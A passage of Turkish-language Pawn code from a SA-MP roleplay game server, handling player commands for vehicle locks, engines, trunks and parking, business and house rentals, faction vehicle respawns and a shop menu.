	       	    if(Arac[vid][aowner] == Karakter[playerid][sqlid] || (Karakter[playerid][meslek] == 2 && Taksi[playerid] == vid) || (Karakter[playerid][birlik] == Arac[vid][abirlik]) || AracAnahtarKontrol(playerid, vid) || IsyeriYetkilisi(playerid, Arac[vid][aisyeri]))
	       	    {
					if(Arac[vid][akilit])
					{
						format(string, sizeof(string), "~g~KILIT ACILDI");
		    			GameTextForPlayer(playerid, string, 2000, 4);
						KilitAc(vid);
						format(string,sizeof(string),"* aracýn kilidini açar.");
						SetPlayerChatBubble(playerid,string,COLOR_CPURPLE2,8.0,10000);
						format(string,sizeof(string),"(( %s aracýn kilidini açar. ))",OyuncuAdiniBul(playerid));
						SendClientMessage(playerid,0xC2A2DAFF,string);
					}
					else
					{
						format(string, sizeof(string), "~r~KILITLENDI");
						GameTextForPlayer(playerid, string, 2000, 4);
		    			KilitKapat(vid);
		    			format(string,sizeof(string),"* aracý kilitler.");
						SetPlayerChatBubble(playerid,string,COLOR_CPURPLE2,8.0,10000);
						format(string,sizeof(string),"(( %s aracý kilitler. ))",OyuncuAdiniBul(playerid));
						SendClientMessage(playerid,0xC2A2DAFF,string);
					}
				}
				else Hata(playerid, "Bu aracýn anahtarýna sahip deðilsiniz.");
	        }
	        else Hata(playerid, "Aracýn yakýnýnda deðilsiniz.");
		    return 1;
		}
		else if(strcmp(string, "motor", true) == 0)
		{
		    if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
		    {
		        new allahini = GetPlayerVehicleID(playerid);
		        new string2[128];
		        if(!IsEngineVehicle(allahini)) return Hata(playerid, "Bu aracýn motorunu açamazsýnýz.");
		        if(GetMotor(allahini) == 1 && !MotoruAciliyor[allahini])
	         	{
					MotoruKapat(allahini);
					format(string,sizeof(string),"* aracýn motorunu durdurur.");
					SetPlayerChatBubble(playerid,string,COLOR_CPURPLE2,8.0,10000);
					format(string,sizeof(string),"(( %s aracýn motorunu durdurur. ))",OyuncuAdiniBul(playerid));
					SendClientMessage(playerid,0xC2A2DAFF,string);
					format(string2, sizeof(string2), "anahtarý çevirerek %s model aracýn motorunu durdurur.", VehicleName[GetVehicleModel(allahini)-400][0]);
					MeGonderArac(playerid, 30.0, string2);
		            return 1;
				}
	       	    if(Arac[allahini][aowner] == Karakter[playerid][sqlid] || (Karakter[playerid][meslek] == 2 && Taksi[playerid] == allahini) || (Karakter[playerid][birlik] == Arac[allahini][abirlik]) || AracAnahtarKontrol(playerid, allahini) || IsyeriYetkilisi(playerid, Arac[allahini][aisyeri]))
				{
					if(GetMotor(allahini) == 0 && !MotoruAciliyor[allahini])
					{
						if(IsAirVehicle(allahini) && !Karakter[playerid][havalisans]) return Mesaj(playerid, HATA_MESAJ, "Bu aracý kullanabilmeniz için hava lisansýna ihtiyacýnýz var.");
	                    if(cezali[allahini] > 2500) return Hata(playerid, "Bu aracýn cezasý bulunmamaktadýr, cezayý ödemeden aracý kullanamazsýnýz.");
	                    if(Arac[allahini][parcalandi]) return Hata(playerid, "Araç parçalandýðý için motorunu çalýþtýramazsýnýz.");
					    if(Modifiyede[playerid] && GetPlayerVehicleSeat(playerid) != 0) return 1;
						MotoruAciliyor[allahini] = true;
						format(string,sizeof(string),"* aracýn motorunu çalýþtýrýr.");
						SetPlayerChatBubble(playerid,string,COLOR_CPURPLE2,8.0,10000);
						format(string,sizeof(string),"(( %s aracýn motorunu çalýþtýrýr. ))",OyuncuAdiniBul(playerid));
						SendClientMessage(playerid,0xC2A2DAFF,string);
						format(string2, sizeof(string2), "anahtarý çevirerek %s model aracýn motorunu çalýþtýrýr.", VehicleName[GetVehicleModel(allahini)-400][0]);
						MeGonderArac(playerid, 30.0, string2);
						SetTimerEx("MotoruAc", 3000, false, "ii", allahini, playerid);
					}
				}
				else Hata(playerid, "Bu aracýn anahtarýna sahip deðilsiniz.");
			}
			else Hata(playerid, "Herhangi bir aracýn içerisinde deðilsiniz.");
		    return 1;
		}
		else if(strcmp(string, "lamba", true) == 0 || strcmp(string, "far", true) == 0)
		{
	      	if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
		    {
		        new vid = GetPlayerVehicleID(playerid);
		        if(Arac[vid][aowner] == Karakter[playerid][sqlid] || (Karakter[playerid][birlik] == Arac[vid][abirlik]) || AracAnahtarKontrol(playerid, vid) || IsyeriYetkilisi(playerid, Arac[vid][aisyeri]))
		        {
					new engine,lights,alarm,doors,bonnet,boot,objective;
					GetVehicleParamsEx(vid,engine,lights,alarm,doors,bonnet,boot,objective);
					if(lights) SetVehicleParamsEx(vid,engine,0,alarm,doors,bonnet,boot,objective);
					else SetVehicleParamsEx(vid,engine,1,alarm,doors,bonnet,boot,objective);
				}
			}
			else Hata(playerid, "Aracýnýzýn içerisinde deðilsiniz.");
			return 1;
		}
		else if(strcmp(string, "bagaj", true) == 0)
		{
		    if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
		    {
		        new vid = GetPlayerVehicleID(playerid);
		        if(IsABike(vid)) return Hata(playerid, "Bu aracýn bagajýný açamazsýnýz.");
		        if(GetMotor(vid))
		        {
			        new engine,lights,alarm,doors,bonnet,boot,objective;
			        GetVehicleParamsEx(vid,engine,lights,alarm,doors,bonnet,boot,objective);
			        if(boot) SetVehicleParamsEx(vid,engine,lights,alarm,doors,bonnet,0,objective);
			        else SetVehicleParamsEx(vid,engine,lights,alarm,doors,bonnet,1,objective);
				}
			}
			else if(!IsPlayerInAnyVehicle(playerid))
			{
			    new allahini = GetNearestVehicle(playerid);
			    if(!IsValidVehicle(allahini)) return Hata(playerid, "Yakýnýnýzda araç yok!");
			    if(Arac[allahini][akilit]) return Hata(playerid, "Araç kilitli.");
			    if(Arac[allahini][aowner] == Karakter[playerid][sqlid] || (Karakter[playerid][meslek] == 2 && Taksi[playerid] == allahini) || (Karakter[playerid][birlik] == Arac[allahini][abirlik]) || AracAnahtarKontrol(playerid, allahini) || IsyeriYetkilisi(playerid, Arac[allahini][aisyeri]))
				{
				    new engine,lights,alarm,doors,bonnet,boot,objective;
			        GetVehicleParamsEx(allahini,engine,lights,alarm,doors,bonnet,boot,objective);
			        if(boot) SetVehicleParamsEx(allahini,engine,lights,alarm,doors,bonnet,0,objective);
			        else SetVehicleParamsEx(allahini,engine,lights,alarm,doors,bonnet,1,objective);
				}
				else return Hata(playerid, "Bu aracýn anahtarý sizde yok.");
			}
			else return Hata(playerid, "Þoför koltuðunda oturmuyorsunuz.");
			return 1;
		}
		else if(strcmp(string, "kaput", true) == 0)
		{
	     	if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
		    {
		        new vid = GetPlayerVehicleID(playerid);
		        if(IsABike(vid)) return Hata(playerid, "Bu aracýn kaputunu açamazsýnýz.");
		        if(GetMotor(vid))
		        {
			        new engine,lights,alarm,doors,bonnet,boot,objective;
			        GetVehicleParamsEx(vid,engine,lights,alarm,doors,bonnet,boot,objective);
			        if(bonnet) SetVehicleParamsEx(vid,engine,lights,alarm,doors,0,boot,objective);
			        else SetVehicleParamsEx(vid,engine,lights,alarm,doors,1,boot,objective);
				}
			}
			else if(!IsPlayerInAnyVehicle(playerid))
			{
			    new allahini = GetNearestVehicle(playerid);
			    if(Arac[allahini][akilit]) return Hata(playerid, "Araç kilitli.");
			    if(Arac[allahini][aowner] == Karakter[playerid][sqlid] || (Karakter[playerid][meslek] == 2 && Taksi[playerid] == allahini) || (Karakter[playerid][birlik] == Arac[allahini][abirlik]) || AracAnahtarKontrol(playerid, allahini) || IsyeriYetkilisi(playerid, Arac[allahini][aisyeri]))
				{
				    new engine,lights,alarm,doors,bonnet,boot,objective;
			        GetVehicleParamsEx(allahini,engine,lights,alarm,doors,bonnet,boot,objective);
			        if(bonnet) SetVehicleParamsEx(allahini,engine,lights,alarm,doors,0,boot,objective);
			        else SetVehicleParamsEx(allahini,engine,lights,alarm,doors,1,boot,objective);
				}
				else return Hata(playerid, "Bu aracýn anahtarý sizde yok.");
			}
			else return Hata(playerid, "Þoför koltuðunda oturmuyorsunuz.");
			return 1;
		}
		else if(strcmp(string, "parksatinal", true) == 0)
		{
		    if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
		    {
		        if(IsPlayerInRangeOfPoint(playerid, 50, 376.1241,-1875.3054,7.8359) || IsPlayerInRangeOfPoint(playerid, 50, 375.9026,-1925.0261,7.8359) || IsPlayerInRangeOfPoint(playerid, 50, 376.0362,-1989.5983,7.8359) || IsPlayerInRangeOfPoint(playerid, 50, 376.1082,-2026.3796,7.8359) || IsPlayerInRangeOfPoint(playerid, 50, 376.1576,-2054.4460,7.8359)) return Hata(playerid, "Bulunduðunuz bölgeye park yapmak yasaktýr.");
		        new vid = GetPlayerVehicleID(playerid);
		        if(Arac[vid][atip] != 5 && Arac[vid][aowner] == Karakter[playerid][sqlid])
		        {
		            if(ParkDurum(playerid))
		            {
		                if(GetPlayerCash(playerid) >= 250)
		                {
							GetVehiclePos(vid, Arac[vid][aposx], Arac[vid][aposy], Arac[vid][aposz]);
							GetVehicleZAngle(vid, Arac[vid][aposa]);
							//RemovePlayerFromVehicle(playerid);
							 /*new Float:x, Float:y, Float:z;
	 		    			GetPlayerPos(playerid, x, y, z);
	 		    			SetPlayerPos(playerid, x, y, z),*/
						   // SetVehicleVirtualWorld(vid, 9931+vid);
						    //MotoruKapat(vid);
						   // Arac[vid][aspawn] = 0;
						    Arac[vid][aspawnsatin] = 1;
		                    //SetPlayerInterior(playerid, 0);
		                    //SetPlayerVirtualWorld(playerid, 0);
	                     	Bilgi(playerid, "Park yeri satýn alýndý.");
							format(string, sizeof(string), "~w~PARK ~g~SATIN ALINDI");
							GameTextForPlayer(playerid, string, 2500, 4);
							AracKaydet(vid);
							GivePlayerCash(playerid,-250);
							//PutPlayerInVehicleEx(playerid, vid, 0);
						}
						else Hata(playerid, "Park alaný satýn alabilmek için $250 ödemelisiniz.");
					}
					else
					{
						format(string, sizeof(string), "~w~PARK ~r~EDILEMEZ");
						GameTextForPlayer(playerid, string, 2500, 4);
					}
				}
				else Hata(playerid, "Bu aracýn anahtarýna sahip deðilsiniz.");
			}
			else Hata(playerid, "Bir aracýn içerisinde deðilsiniz.");
			return 1;
		}
		else if(strcmp(string, "park", true) == 0 || strcmp(string, "parket", true) == 0)
		{
		    if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
		    {
				new vid = GetPlayerVehicleID(playerid);
				if(Arac[vid][atip]!= 5 && Arac[vid][aowner] == Karakter[playerid][sqlid])
				{
				    if(Arac[vid][aspawnsatin])
				    {
						if(PlayerToPoint(5.0,playerid,Arac[vid][aposx],Arac[vid][aposy],Arac[vid][aposz]) || GetPlayerVirtualWorld(playerid) > 0)
						{
							GetVehiclePos(vid, Arac[vid][aposx], Arac[vid][aposy], Arac[vid][aposz]);
							GetVehicleZAngle(vid, Arac[vid][aposa]);
	 		    			/*new Float:x, Float:y, Float:z;
	 		    			GetPlayerPos(playerid, x, y, z);
	 		    			SetPlayerPos(playerid, x, y, z),*/
	 		    			RemovePlayerFromVehicle(playerid);
						    //SetVehicleVirtualWorld(vid, 9931+vid);
						    //Aractamiri(vid);
						    SetPVarInt(playerid, "VehicleRepair", 1);
						    MotoruKapat(vid);
						    Arac[vid][ainterior] = GetPlayerInterior(playerid);
							Arac[vid][avworld] = GetPlayerVirtualWorld(playerid);
						    //Arac[vid][aspawn] = 0;
	                        //SetPlayerInteriorEx(playerid, 0);
	                        //SetPlayerVirtualWorld(playerid, 0);
							format(string, sizeof(string), "~w~ARAC ~g~PARK EDILDI");
							GameTextForPlayer(playerid, string, 2500, 4);
							AracKaydet(vid);
						}
						else
						{
						    SetPVarInt(playerid, "ParkCP", 1);
						    SetPlayerCheckpoint(playerid, Arac[vid][aposx], Arac[vid][aposy], Arac[vid][aposz], 4.0);
						    Bilgi(playerid, "Aracýnýzýn park yeri haritada iþaretlendi.");
						}
					}
					else Hata(playerid, "Aracýnýzý parkedebilmek için park yeri satýn almalýsýnýz. (/a parksatinal)");
				}
				else Hata(playerid, "Bu aracýn anahtarýna sahip deðilsiniz.");
		    }
		    return 1;
		}
		else if(strcmp(string, "parkdurum", true) == 0)
		{
			if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
			{
			    new vid = GetPlayerVehicleID(playerid);
			    if(Arac[vid][atip] != 5 && Arac[vid][aowner] == Karakter[playerid][sqlid])
			    {
			        if(ParkDurum(playerid))
			        {
						format(string, sizeof(string), "~w~PARK YERI ~g~MUSAIT");
						GameTextForPlayer(playerid, string, 2500, 4);
			        }
			        else
			        {
						format(string, sizeof(string), "~w~PARK ~r~EDILEMEZ");
						GameTextForPlayer(playerid, string, 2500, 4);
			        }
				}
			}
			return 1;
		}
		else
		{
			SendClientMessage(playerid, -1, "Geçerli fonksiyonlar: satinal, kirala, sure, liste, bilgi, park, sat, kilit, kilitid, gps, hurda, in, sigorta");
			if(Birlik[Karakter[playerid][birlik]][ftip] == CETE || Birlik[Karakter[playerid][birlik]][ftip] == MC || Birlik[Karakter[playerid][birlik]][ftip] == MAFYA) SendClientMessage(playerid, -1, "Geçerli fonksiyonlar: cam, kaput, bagaj, far, yedekanahtar, radyo, cezaode, at, rutbe, cek, gelir, kutular");
	        else if(Birlik[Karakter[playerid][birlik]][ftip] == YARIS) SendClientMessage(playerid, -1, "Geçerli fonksiyonlar: cam, kaput, bagaj, far, yedekanahtar, radyo, cezaode, at, rutbe, cek, gelir, parcala, tahta");
			else SendClientMessage(playerid, -1, "Geçerli fonksiyonlar: cam, kaput, bagaj, far, yedekanahtar, radyo, cezaode, at, rutbe, cek, gelir");
			return 1;
		}
		return 1;
	}
	if(strcmp(string, "/isyeriyonet", true) == 0 || strcmp(string, "/iyonet", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
	        new mesafe,_asay=0,stringx[500];
			if(!IsPlayerInAnyVehicle(playerid)) mesafe = IsyeriMesafesi(2.0, playerid);
			else mesafe = IsyeriMesafesi(5.0, playerid);
	        new itipi[40];
	        switch(Isyeri[mesafe][itip])
	        {
	            case 0: itipi = "Yok";
	            case 1: itipi = "Market";
	            case 2: itipi = "Restorant";
	            case 3: itipi = "Restorant";
	            case 4: itipi = "Restorant";
	            case 5: itipi = "Bar";
	            case 6: itipi = "Kýyafet Dükkaný";
	            case 7: itipi = "Silah Dükkaný";
	            case 8: itipi = "Depo";
	            case 9: itipi = "Fabrika";
	            case 10: itipi = "Pay 'n Spray";
	            case 11: itipi = "Banka";
	            case 14: itipi = "GYM";
	            case 15: itipi = "Modifiye Garajý";
	            case 16: itipi = "Sevkiyat Þirketi";
	            case 17: itipi = "Rehinci Dükkaný";
	            case 18: itipi = "Özel Kýyafet Dükkaný";
	            case 19: itipi = "Spor Aletleri Dükkaný";
	            case 20: itipi = "Normal Galeri";
	            case 21: itipi = "Super Sport Galeri";
	            case 22: itipi = "Hafriyat Þirketi";
				case 23: itipi = "Ofis";
				case 24: itipi = "Taksi Þirketi";
				case 25: itipi = "Otobüs Þirketi";
				case 26: itipi = "Kiralýk Araç Þirketi";
				case 27: itipi = "Hastane";
				case 28: itipi = "Benzin Ýstasyonu";
			}
			for(new a=0;a<MAX_VEHICLES;a++)
			{
			    if(Arac[a][aisyeri] == mesafe) _asay++;
			}
	        if(mesafe == 0){Hata(playerid, "Ýþyerini yönetebilmek için iþyerinizin yakýnýnda olmalýsýnýz."); return 1; }
	        if(Isyeri[mesafe][isahip] != Karakter[playerid][sqlid] && Isyeri[mesafe][ortak] != Karakter[playerid][sqlid] && Isyeri[mesafe][kiralayan] != Karakter[playerid][sqlid])
	        {
	            Hata(playerid, "Bu iþyerini yönetemezsiniz.");
	            return 1;
			}
	        if(PlayerToPoint(5.0, playerid, Isyeri[mesafe][girisX], Isyeri[mesafe][girisY], Isyeri[mesafe][girisZ]))
	        {
	            format(stringx, sizeof(stringx), "Ýþlem\tDurum\nÝsim\t %s\nTip\t %s\nSeviye\t %d\nKarþýlama Metni\t %s\nMenüyü Düzenle\t %d/10 Düzenlenebilir Menü\nStok Güncelle\t Mevcut Stok %d\nÝþçi Al\t Mevcut Ýþçi %d/10\nGiriþ Fiyatý\t %d$\nVergi\t %d$\nÝþyeri Aracý Yap\nAraçlar\t %d", Isyeri[mesafe][iad], itipi, Isyeri[mesafe][iseviye], Isyeri[mesafe][karsilama], IsyeriMenuSay(mesafe), Isyeri[mesafe][istok], IsciSay(mesafe), Isyeri[mesafe][girisucreti], Isyeri[mesafe][ivergi], _asay);
				ShowPlayerDialog(playerid, 38, DIALOG_STYLE_TABLIST_HEADERS, "Ýþyeri Yönetim Paneli", stringx, "Seç", "Kapat");
			}
		}
		return 1;
	}
	if(!strcmp(string, "/ikirala", true) || Buysa("/ikira",string))
	{
	    if(IsPlayerConnected(playerid))
	    {
	        new mesafe = IsyeriMesafesi(3.0, playerid);
	        if(mesafe == 0)
	        {
	            Hata(playerid, "Yakýnýnýzda bir iþyeri yok.");
	            return 1;
	        }
	        if(Isyeri[mesafe][isahip] != -1 && Isyeri[mesafe][kira] == 1 && Isyeri[mesafe][kiralayan] == -1)
	        {
	            if(GetPlayerCash(playerid) >= Isyeri[mesafe][kirafiyat])
	            {
	                Isyeri[mesafe][kiralayan] = Karakter[playerid][sqlid];
	                GivePlayerCash(playerid, -Isyeri[mesafe][kirafiyat]);
	                new pbanka2;
					pbanka2 = BankaParaSQL(Isyeri[mesafe][isahip]);
					pbanka2 += Isyeri[mesafe][kirafiyat];
					BankaParaDuzenSQL(Isyeri[mesafe][isahip], pbanka2);
	                Bilgi(playerid, "Ýþyerini baþarýyla kiraladýnýz.");
					Ipucu(playerid, "Kirayý iptal etmek istiyorsanýz ''/kiraiptal''");
	                KarakterKaydet(playerid);
	                IsyeriAyarla(mesafe);
	                return 1;
	            }
	            else
	            {
	                Hata(playerid, "Bu iþyerini kiralayabilmek için yeterli paranýz yok.");
	                return 1;
	            }
	        }
	        else
	        {
	            Hata(playerid, "Bu iþyeri kiralanabilir durumda deðil.");
	        }
	    }
	    return 1;
	}
	if(!strcmp(string, "/ikiradurumu", true) || Buysa("/ikiradurum",string))
	{
		new mesafe = IsyeriMesafesi(3.0, playerid);
		if(mesafe == 0)
		{
			Hata(playerid, "Yakýnýnýzda bir iþyeri yok.");
			return 1;
		}
		if(Isyeri[mesafe][isahip] != Karakter[playerid][sqlid])
		{
		    Hata(playerid, "Bu iþyeri size ait deðil.");
		    return 1;
		}
		if(Isyeri[mesafe][kira] == 0)
		{
		    Isyeri[mesafe][kira] = 1;
		    IsyeriKaydet(mesafe);
		    Bilgi(playerid, "Ýþyerinizin durumu artýk ''kiralanabilir'' olarak ayarlandý.");
		    IsyeriAyarla(mesafe);
		}
		else if(Isyeri[mesafe][kira] == 1)
		{
		    Isyeri[mesafe][kira] = 0;
		    Isyeri[mesafe][kiralayan] = -1;
		    Isyeri[mesafe][kirafiyat] = 0;
		    IsyeriKaydet(mesafe);
		    Bilgi(playerid, "Ýþyerinizin durumu artýk ''kiralanamaz'' olarak ayarlandý.");
		    IsyeriAyarla(mesafe);
		}
		return 1;
	}
	if(!strcmp(string, "/ikirafiyati", true) || Buysa("/ikirafiyat", string))
	{
		new mesafe = IsyeriMesafesi(3.0, playerid);
		if(mesafe == 0)
		{
			Hata(playerid, "Yakýnýnýzda bir iþyeri yok.");
			return 1;
		}
		if(Isyeri[mesafe][isahip] != Karakter[playerid][sqlid])
		{
		    Hata(playerid, "Bu iþyerinin anahtarý sizde yok.");
			return 1;
		}
		string = strtok(cmdtext, idx);
		if(!strlen(string))
		{
		    Kullanim(playerid, "/ikirafiyati [miktar]");
		    return 1;
		}
		if(strval(string) < 1 || strval(string) > 21000)
		{
		    Hata(playerid, "Belirlediðiniz fiyat uygun deðil.");
		    return 1;
		}
		Isyeri[mesafe][kirafiyat] = strval(string);
		format(string, sizeof(string), "Ýþyerinizin kiralanabilir fiyatý %d$ olarak belirlendi.", Isyeri[mesafe][kirafiyat]);
		Bilgi(playerid, string);
		IsyeriKaydet(mesafe);
        IsyeriAyarla(mesafe);
		return 1;
	}
	if(!strcmp(	string, "/evkirafiyati", true) || Buysa("/ekirafiyat",string) || Buysa("/evkirafiyat",string))
	{
	    new arc = EvMesafesi(3.0, playerid);
	    if(arc == 0)
		{
		    arc = EvIceridenMesafesi(playerid);
		    if(arc == 0) return Hata(playerid, "Yakýnýnýzda bir ev yok.");
		}
		if(Ev[arc][esahip] != Karakter[playerid][sqlid])
		{
		    Hata(playerid, "Bu evin anahtarý sizde yok.");
		    return 1;
		}
		string = strtok(cmdtext, idx);
		if(!strlen(string))
		{
		    Kullanim(playerid, "/evkirafiyati [miktar]");
		    return 1;
		}
		if(strval(string) < 1 || strval(string) > 21000)
		{
		    Hata(playerid, "Belirlediðiniz fiyat uygun deðil.");
			return 1;
		}
		Ev[arc][kirafiyat] = strval(string);
		format(string, sizeof(string), "Evinizin kiralanabilir fiyatý %d$ olarak belirlendi.", Ev[arc][kirafiyat]);
		Bilgi(playerid, string);
		EvKaydet(arc);
		EvAyarla(arc);
		return 1;
	}
	if(!strcmp(string, "/evkiradurumu", true) || Buysa("/ekiradurum",string) || Buysa("/evkiradurum",string))
	{
	    new arc = EvMesafesi(3.0, playerid);
	    if(arc == 0)
		{
		    arc = EvIceridenMesafesi(playerid);
		    if(arc == 0) return Hata(playerid, "Yakýnýnýzda bir ev yok.");
		}
		if(Ev[arc][esahip] != Karakter[playerid][sqlid])
		{
		    Hata(playerid, "Bu evin anahtarý sizde yok.");
		    return 1;
		}
		if(Ev[arc][kira] == 0)
		{
		    Ev[arc][kira] = 1;
		    Ev[arc][kiralayan] = -1;
		    EvKaydet(arc);
		    Bilgi(playerid, "Evinizin durumu artýk ''kiralanabilir'' olarak ayarlandý.");
		    DestroyColouredCheckpoint(Ev[arc][ecp]);
		    EvAyarla(arc);
		}
		else if(Ev[arc][kira] == 1)
		{
		    Bilgi(playerid, "Evinizin durumu artýk ''kiralanamaz'' olarak ayarlandý.");
		    Ev[arc][kira] = 0;
		    Ev[arc][kiralayan] = -1;
		    Ev[arc][kirafiyat] = 0;
		    EvKaydet(arc);
		    DestroyColouredCheckpoint(Ev[arc][ecp]);
		    EvAyarla(arc);
		}
		return 1;
	}
	if(!strcmp(string, "/evkirala", true) || Buysa("/ekira",string) || Buysa("/evkira",string))
	{
	    if(IsPlayerConnected(playerid))
	    {
			new arc = EvMesafesi(3.0, playerid);
   			if(arc == 0) return Hata(playerid, "Yakýnýnýzda bir ev yok.");
			if(Ev[arc][esahip] != -1 && Ev[arc][kira] == 1 && Ev[arc][kiralayan] == -1)
			{
			    if(GetPlayerCash(playerid) >= Ev[arc][kirafiyat])
			    {
			        if(Ev[arc][esahip] == Karakter[playerid][sqlid]) return Hata(playerid, "Kendi evinizi kiralayamazsýnýz.");
					Ev[arc][kiralayan] = Karakter[playerid][sqlid];
					GivePlayerCash(playerid, -Ev[arc][kirafiyat]);
					new pbanka2;
					pbanka2 = BankaParaSQL(Ev[arc][esahip]);
					pbanka2 += Ev[arc][kirafiyat];
					BankaParaDuzenSQL(Ev[arc][esahip], pbanka2);
					Bilgi(playerid, "Evi baþarýyla kiraladýnýz.");
					Ipucu(playerid, "Kirayý iptal etmek istiyorsanýz ''/kiraiptal''");
					KarakterKaydet(playerid);
					DestroyColouredCheckpoint(Ev[arc][ecp]);
					EvAyarla(arc);
					return 1;
			    }
			    else
			    {
			        Hata(playerid, "Bu evi kiralayabilmek için yeterli paranýz yok.");
					return 1;
				}
			}
			else
			{
			    Hata(playerid, "Bu ev kiralanabilir durumda deðil.");
			}
	    }
	    return 1;
	}
	if(strcmp(string, "/evkilit", true) == 0 || strcmp(string, "/ekilit", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
		    new arc = EvMesafesi(3.0,playerid);
		    if(arc == 0)
			{
			    arc = EvIceridenMesafesi(playerid);
			    if(arc == 0) return Hata(playerid,"Yakýnýnýzda bir ev yok.");
		    }
		    if(Ev[arc][esahip] != Karakter[playerid][sqlid] && Ev[arc][kiralayan] != Karakter[playerid][sqlid] && !EvAnahtarKontrol(playerid, arc))
			{
			    Hata(playerid,"Bu evin anahtarý sizde yok.");
			    return 1;
		    }
		    if(Ev[arc][ekilit] == 0)
			{
		        OnPlayerCommandPerformed(playerid,"/me anahtarlarýný çýkarýr ve evini kilitler.",0);
		        Ev[arc][ekilit] = 1;
		        EvKaydet(arc);
	        }
			else
			{
		        OnPlayerCommandPerformed(playerid,"/me anahtarlarýný çýkarýr ve evinin kilidini açar.",0);
		        Ev[arc][ekilit] = 0;
		        EvKaydet(arc);
	        }
  		}
		return 1;
	}
	if(strcmp(string, "/ikilit", true)  == 0 || strcmp(string, "/isyerikilit", true) == 0 || strcmp(string, "/iskilit", true) == 0)
	{
		if(IsPlayerConnected(playerid))
		{
			new mesafe = IsyeriMesafesi(2.0, playerid);
			if(mesafe == 0)
			{
			    mesafe = IsyeriIceridenMesafesi(2.0, playerid);
			    if(mesafe == 0)
			    {
				    Hata(playerid, "Yakýnýnýzda hiç iþyeri yok.");
				    return 1;
				}
			}
			if(Isyeri[mesafe][isahip] != Karakter[playerid][sqlid] && Isyeri[mesafe][kiralayan] != Karakter[playerid][sqlid] && Isyeri[mesafe][ortak] != Karakter[playerid][sqlid])
			{
			    Hata(playerid, "Bu iþyerinin anahtarýna sahip deðilsiniz.");
			    return 1;
			}
			if(Isyeri[mesafe][muhur] == 1) return Hata(playerid, "Bu iþyeri mühürlü.");
			if(Isyeri[mesafe][ivergi] >= Isyeri[mesafe][ifiyat]*35/100) return Hata(playerid, "Bu iþyeri vergi kilidinde.");
			if(Isyeri[mesafe][ikilit] == 0)
			{
				OnPlayerCommandPerformed(playerid,"/me anahtarlarýný çýkarýr ve iþyerini kilitler.",0);
				Isyeri[mesafe][ikilit] = 1;
			}
			else
			{
				OnPlayerCommandPerformed(playerid,"/me anahtarlarýný çýkarýr ve iþyerinin kilidini açar.",0);
				Isyeri[mesafe][ikilit] = 0;
			}
		}
		return 1;
	}
	if(strcmp(string,"/frespawn",true) == 0)
	{
	    if(Karakter[playerid][birlik] == 1 || Karakter[playerid][birlik] == 2 || Karakter[playerid][birlik] == 3 || Karakter[playerid][birlik] == 5 || Karakter[playerid][adminlevel] > 0)
	    {
	        if((Karakter[playerid][rutbe] <= 11 && Karakter[playerid][birlik] == 1) || (Karakter[playerid][rutbe] == 1) || (Karakter[playerid][rutbe] == 2))
	        {
				for(new i; i < MAX_VEHICLES; i++)
				{
				    if(Arac[i][abirlik] == Karakter[playerid][birlik])
				    {
				        if(!IsVehicleOccupied(i))
				        {
				            SetVehicleToRespawn(i);
				            Aractamiri(i);
				        }
				    }
				}
				Bilgi(playerid, "Oluþumdaki tüm araçlar spawn edildi.");
				new mstring[128];
		        format(mstring, sizeof(mstring), "Birliðe ait tüm araçlar %s tarafýndan respawn edildi.",OyuncuAdiniBul(playerid));
		        if(Birlik[Karakter[playerid][birlik]][ftip] == LSPD) LSPDGonder(mstring);
		        else BirlikGonder(playerid,mstring);
				return 1;
	        }
	    } else {
			if(Birlik[Karakter[playerid][birlik]][blider] == Karakter[playerid][sqlid]) {
				if(GetPlayerCash(playerid) < 1000) return Mesaj(playerid, HATA_MESAJ, "Birlik araçlarýna respawn atma ücreti 1.000$'dýr.");
				for(new i; i < MAX_VEHICLES; i++)
				{
				    if(Arac[i][abirlik] == Karakter[playerid][birlik])
				    {
				        if(!IsVehicleOccupied(i))
				        {
				            SetVehicleToRespawn(i);
				            Aractamiri(i);
				        }
				    }
				}
				Mesaj(playerid, BILGI_MESAJ, "Oluþumdaki tüm araçlar spawn edildi.");
				GivePlayerCash(playerid, -1000);
			}
		}
	    return 1;
	}
	if(strcmp(string, "/isyerlerim", true) == 0 || strcmp(string, "/isyerim", true) == 0 || strcmp(string, "/dukkanim", true) == 0 || strcmp(string, "/dukkanlarim", true) == 0)
	{
	    if(!Isyerlerim(playerid))
	    {
	        Hata(playerid, "Adýnýza kayýtlý hiç iþyeri bulunamadý.");
	        return 1;
		}
		format(string, sizeof(string), "{47B312}____________________ÝÞYERLERÝM(%d)____________________", Isyerlerim(playerid));
		SendClientMessage(playerid, COLOR_GREEN, string);
		foreach(new i : Business)
		{
		    if(Isyeri[i][isahip] == Karakter[playerid][sqlid])
		    {
		        format(string, sizeof(string), "- %s (ID: %d - deðer: %d$ - vergi: 0$ - kilit: %d", Isyeri[i][iad], Isyeri[i][iid], Isyeri[i][ifiyat], Isyeri[i][ikilit]);
		        SendClientMessage(playerid, COLOR_GREY, string);
			}
		}
		SendClientMessage(playerid, COLOR_GREEN, "{47B312}_____________________________________________________");
		return 1;
	}
	if(strcmp(string, "/satinal", true) == 0)
 	{
        foreach(new i : Business)
        {
            if(Isyeri[i][itip] == 1)
            {
                if(PlayerToPoint(20.0, playerid, Isyeri[i][cikisX], Isyeri[i][cikisY], Isyeri[i][cikisZ]))
                {
	                if(GetPlayerVirtualWorld(playerid) == Isyeri[i][icikisvw])
	                {
	                    if(Isyeri[i][istok] != 0)
	                    {
	                        SetPVarInt(playerid, "IsyeriBuy", i);
	                        new mstring[1024];
							format(mstring, sizeof(mstring), "Ürün\tFiyat\n Telefon\t 200"DOLAR"$"C1"\n Sopa\t 600"DOLAR"$"C1"\n Býçak\t 800"DOLAR"$"C1"\n Spray\t 750"DOLAR"$"C1"\n Maske\t 15000"DOLAR"$"C1"\n Sigara\t 20"DOLAR"$"C1"\n Odun\t 75"DOLAR"$"C1"\n Bira\t 15"DOLAR"$");
